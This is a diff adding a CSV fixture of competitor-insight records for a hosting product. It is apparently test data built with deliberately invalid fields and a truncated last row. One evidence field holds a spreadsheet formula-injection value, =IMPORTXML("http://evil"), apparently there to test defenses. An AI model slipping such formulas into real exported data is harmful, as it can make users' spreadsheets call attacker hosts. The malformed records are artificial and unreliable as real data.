@@ -1,0 +1,4 @@
+"insight_id","run_id","captured_at","product_line","competitor","channel","source_mode","source_url","observation","evidence","meaning","content_idea","tags","dup_of"
+"INS-20261005-080000-01","RUN-20261005-090000","yesterday","hosting","A","website","public-auto","httpfoo","Quan sát","xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx","Ý nghĩa","Ý tưởng","offer","not-an-id"
+"INS-20261005-080000-00","RUN-20261005-080000","2026-10-05T08:05:00+07:00","hosting","A","website","public-auto","https://a.vn","Quan sát","=IMPORTXML(""http://evil"")","Ý nghĩa","Ý tưởng","offer",""
+"INS-20261005-080000-03","RUN-20261005-080000"
